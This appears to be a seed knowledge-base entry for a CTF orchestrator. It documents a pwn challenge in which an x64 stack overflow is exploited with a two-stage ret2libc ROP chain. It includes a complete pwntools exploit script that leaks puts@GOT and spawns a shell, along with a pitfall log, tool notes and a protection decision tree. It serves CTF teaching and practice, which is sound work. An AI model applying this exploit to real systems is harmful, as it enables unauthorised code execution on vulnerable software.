# [Seed] CTF Pwn — x64 Stack Overflow + ROP Chain Calling system

## Scenario Category
CTF / binary exploitation

## Target Overview
A 64-bit ELF with an out-of-bounds `read()` into a stack buffer. NX (non-executable stack) is enabled but there is no PIE and no stack canary. Use ROP gadgets to call libc's `system("/bin/sh")` and get a shell.

## Complete Execution Chain

1. Basic recon
   ```bash
   file vuln          # ELF 64-bit, dynamically linked, not stripped
   checksec vuln      # NX enabled, No PIE, No Canary, Partial RELRO
   strings vuln | grep -i 'flag\|/bin/sh\|system'
   ```
2. Inspect main with IDA / Ghidra → find `read(0, buf, 0x100)` but `buf` is only 0x40 bytes
3. Compute the overflow offset
   ```bash
   pwndbg> cyclic 200
   # Feed it to the target program; after the crash, look at RSP
   pwndbg> cyclic -l 0x6161616c
   # offset = 72
   ```
4. With no PIE, PLT and GOT are at fixed addresses
5. Stage 1 (no libc info): leak `puts@GOT` to compute the libc base
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI)
   payload += p64(elf.got['puts'])
   payload += p64(elf.plt['puts'])
   payload += p64(elf.symbols['main'])     # return to main for a second round
   ```
6. Receive the puts output and identify the libc version (query libc-database)
7. Stage 2: build system("/bin/sh")
   ```python
   payload  = b'A' * 72
   payload += p64(POP_RDI) + p64(libc_base + libc.search(b'/bin/sh').next())
   payload += p64(libc_base + libc.symbols['system'])
   ```
8. Get the shell → cat flag

## Pitfall Log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| The program crashes after calling system via ROP; no shell | The stack is not 16-byte aligned (Ubuntu 18.04+ is strict about movaps) | Add a ret gadget before system for padding | 30min |
| Works locally, fails remotely | libc versions differ | Use puts to leak one function address → query libc-database for the exact version | 40min |
| pwntools recv hangs | The program used setbuf(NULL) but the remote did not disable stderr buffering | Sync precisely with sendlineafter / recvuntil | 15min |
| SIGPIPE as soon as the remote is hit | The stage-2 payload still used the previous round's io object | After `process` / `remote`, the io must reuse the same connection; once the main process dies it is over | 20min |
| ROPgadget output is too large | The tool lists all gadgets by default | Filter with `ROPgadget --binary vuln --only "pop\|ret"` | 5min |

## Toolchain Findings

- **pwntools** is the de facto standard for writing exploits in Python (`from pwn import *`)
- **pwndbg** is 10x stronger than stock GDB (cyclic / vmmap / heap commands)
- **ROPgadget** vs **ropper**: ropper's output is friendlier and supports searching syscall chains
- **libc-database** matches the exact libc version from a single leaked libc function address
- **one_gadget** finds a single libc gadget that directly execve("/bin/sh") — shorter than manual ROP

## Key Code/Commands

Complete exploit template:

```python
#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./vuln')
libc = ELF('./libc.so.6')

POP_RDI = 0x401243   # ROPgadget --binary vuln | grep "pop rdi"
RET     = 0x40101a   # for stack alignment

def exp():
    io = remote('chal.example.com', 31337)
    # io = process('./vuln')

    # Stage 1: leak puts@GOT
    payload  = b'A' * 72
    payload += p64(POP_RDI) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts'])
    payload += p64(elf.symbols['main'])

    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.symbols['puts']
    log.success(f'libc base = {hex(libc.address)}')

    # Stage 2: system('/bin/sh')
    bin_sh = next(libc.search(b'/bin/sh'))
    payload  = b'A' * 72
    payload += p64(RET)             # 16-byte stack alignment
    payload += p64(POP_RDI) + p64(bin_sh)
    payload += p64(libc.symbols['system'])

    io.sendlineafter(b'> ', payload)
    io.interactive()

if __name__ == '__main__':
    exp()
```

## Improvement Suggestions for This Package

- CTF-Sandbox-Orchestrator's `competition-reverse-pwn` should add a `pwn-rop-cheatsheet.md` turning this flow into a template
- Add pwntools / pwndbg / one_gadget to the bootstrap manifest

## Reusable Patterns/Script Snippets

**ROP exploitation decision tree**:

```text
checksec → look at the protections
├── No NX → shellcode directly (old-school approach)
├── NX + No PIE → classic ret2libc
├── NX + PIE + No Canary → leak the PIE base first → ret2libc
├── Canary present → leak the Canary first (format string / off-by-one)
└── Full RELRO + Canary + PIE → hard; common tricks: fork without ASLR re-randomization / __libc_start_main / SROP
```

**libc leak → exploitation, standard two-stage payload**:

```text
Stage 1: leak puts@GOT → compute the libc base → return to main
Stage 2: pop rdi; "/bin/sh"; ret; system
```

## Evolution Actions
- [ ] Add a pwn quick-reference page to the CTF orchestrator
- [ ] Add pwntools / pwndbg / one_gadget to bootstrap-manifest
- [ ] Reference this case from reverse-engineering/tools-dynamic.md

## Environment Info
- Kali 2026.x / Ubuntu 22.04
- pwntools 4.x, pwndbg latest, ROPgadget 7.x
- libc versions: glibc 2.31 / 2.35 (common on CTF platforms)
- Target architecture: x86_64

## De-identification Requirement
This entry is seed data written from public CTF technical patterns; it involves no real competition challenges or closed-source systems.
